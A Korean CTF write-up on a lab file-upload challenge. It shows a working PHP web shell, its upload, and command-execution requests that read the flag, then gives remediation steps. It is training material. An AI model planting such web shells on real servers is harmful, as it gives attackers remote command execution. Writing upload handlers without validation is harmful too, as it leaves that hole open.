+++
title = "VulnABLE CTF [LUXORA] Write-up: File Upload 🥉 Bronze"
description = "LUXORA 플랫폼의 기본 File Upload 취약점을 통한 리버스 쉘(Reverse Shell) 획득 상세 롸잇업"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "File Upload", "Bronze", "Web Shell", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: File Upload 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: File & Resource Layer (File Upload)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/upload/bronze`
- **목표**: 프로필 사진 업로드 기능에 확장자 검증이 누락된 취약점을 악용하여, 시스템 시스템 명령어를 실행할 수 있는 웹 쉘(Web Shell)을 업로드하고 서버 제어권을 획득하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/upload/bronze` 경로에는 사용자의 아바타(Avatar) 이미지를 변경할 수 있는 파일 업로드 폼이 있습니다.

정상적인 이미지 파일(`avatar.png`)을 선택하여 업로드 버튼을 누릅니다.
업로드가 성공하면 화면에 다음과 같은 메시지가 뜹니다.
`File successfully uploaded to /uploads/avatar.png`

**[해커의 사고 과정]**
1. 사용자가 올린 파일이 서버의 `/uploads/` 라는 공개된(Public) 디렉터리에 그대로 저장된다.
2. 만약 이 폴더에서 PHP 등의 서버 사이드 스크립트가 실행될 수 있다면?
3. 내가 이미지 대신 악성 PHP 코드 파일(`shell.php`)을 올려서 실행시킬 수 있다!

---

## 💥 2. 취약점 식별 및 악성 스크립트 작성 (Exploitation)

개발자가 업로드되는 파일의 확장자나 내용(MIME Type)을 전혀 검사하지 않고 그대로 서버에 저장한다고 가정하고 가장 기본적인 웹 쉘을 작성합니다.

### 💡 웹 쉘(Web Shell) 코드 작성
텍스트 에디터를 열어 `shell.php` 라는 파일을 만들고 다음 코드를 넣습니다.

```php
<?php
// 파라미터 'cmd'로 전달받은 시스템 명령어를 실행하는 간단한 쉘
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

### 🚀 파일 업로드 전송
해당 `shell.php` 파일을 폼에 첨부하고 업로드(Submit)합니다.

**[서버의 응답]**
```text
File successfully uploaded to /uploads/shell.php
```
에러 없이 아주 깔끔하게 파일이 저장되었습니다! (Bronze 난이도답게 아무런 검증이 없었습니다.)

---

## 🚀 3. 원격 코드 실행 (RCE) 및 결과 확인

이제 웹 브라우저를 열고 우리가 올린 웹 쉘에 접근합니다. 그리고 `cmd` 파라미터로 리눅스 시스템 명령어 `id` 와 `ls -la` 를 차례대로 날려봅니다.

**[명령어 실행 1]**
```http
GET /uploads/shell.php?cmd=id
```
➔ 응답: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`
서버 시스템 권한을 획득했습니다!

**[명령어 실행 2: 플래그 찾기]**
```http
GET /uploads/shell.php?cmd=cat%20/flag_upload_bronze.txt
```
*(루트 디렉터리 등에 있을 법한 플래그 파일을 `ls`와 `cat`으로 찾아 읽습니다.)*

### 🔍 서버의 응답
```text
<pre>
FLAG{UPLOAD_🥉_NO_FILTER_A1B2C3}
</pre>
```

---

## 🚩 4. 롸잇업 결론 및 플래그

업로드 기능에 파일 타입 검증(Validation)이 전무할 때, 해커가 얼마나 쉽고 빠르게 서버를 장악할 수 있는지를 확인했습니다.

**🔥 획득한 플래그:**
`FLAG{UPLOAD_🥉_NO_FILTER_A1B2C3}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
사용자가 보낸 파일 이름과 확장자를 전적으로 신뢰하여 웹 루트 디렉터리에 그대로 저장하고, 그 폴더에서 스크립트 실행을 허용한 것이 치명적입니다.

* **안전한 패치 가이드**
1. **화이트리스트(Whitelist) 확장자 검사**: 백엔드에서 파일 확장자가 `.jpg`, `.png`, `.gif` 인지 꼼꼼하게 문자열 비교를 해야 합니다. (정규식 `/\.(jpg|jpeg|png|gif)$/i` 사용)
2. **MIME 및 헤더 검증**: 확장자뿐만 아니라 파일의 실제 시그니처(Magic Number)를 확인하여 진짜 이미지 파일인지 검사해야 합니다.
3. **업로드 디렉터리 실행 권한 박탈**: Apache나 Nginx 설정에서, 사용자가 파일을 올리는 `/uploads/` 디렉터리 내에서는 `.php` 확장자가 실행되지 않도록(`php_admin_flag engine off` 등) 강제해야 합니다.